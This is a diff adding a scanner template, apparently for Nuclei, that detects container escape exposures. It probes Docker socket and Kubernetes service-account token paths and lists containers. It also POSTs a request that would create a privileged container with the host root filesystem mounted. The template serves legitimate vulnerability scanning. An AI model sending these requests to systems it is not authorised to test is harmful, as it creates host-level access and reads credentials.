@@ -1,0 +1,96 @@
+id: container-escape-detection
+info:
+  name: Container Escape Vulnerability Detection
+  author: geeknik
+  severity: critical
+  description: |
+    Detects indicators of container escape vulnerabilities including exposed
+    Docker sockets, privileged containers, and host filesystem access.
+  reference:
+    - https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+    - https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+  classification:
+    cwe-id: CWE-269
+  tags: docker,container,escape,privilege-escalation,critical
+  metadata:
+    max-request: 10
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/var/run/docker.sock"
+      - "{{BaseURL}}/.dockerenv"
+      - "{{BaseURL}}/secrets/kubernetes.io/serviceaccount/token"
+      - "{{BaseURL}}/run/secrets/kubernetes.io/serviceaccount/token"
+      - "{{BaseURL}}/var/run/secrets/kubernetes.io/serviceaccount/token"
+      - "{{BaseURL}}/proc/self/cgroup"
+      - "{{BaseURL}}/proc/1/cgroup"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "docker"
+          - "kubepods"
+          - "containerd"
+
+      - type: regex
+        part: body
+        regex:
+          - '/docker/[a-f0-9]{64}'
+          - '/kubepods/[a-f0-9-]+'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1.24/containers/json"
+      - "{{BaseURL}}/v1.40/containers/json"
+      - "{{BaseURL}}/v1.41/containers/json"
+
+    headers:
+      Host: docker
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Id":'
+          - '"Image":'
+          - '"Command":'
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/containers/create"
+
+    headers:
+      Content-Type: application/json
+      Host: docker
+
+    body: |
+      {
+        "Image": "alpine",
+        "Cmd": ["sh", "-c", "echo container_escape_test"],
+        "HostConfig": {
+          "Privileged": true,
+          "Binds": ["/:/host"]
+        }
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"Id":'
+
+    extractors:
+      - type: json
+        json:
+          - '.Id'
+          - '.Warnings'
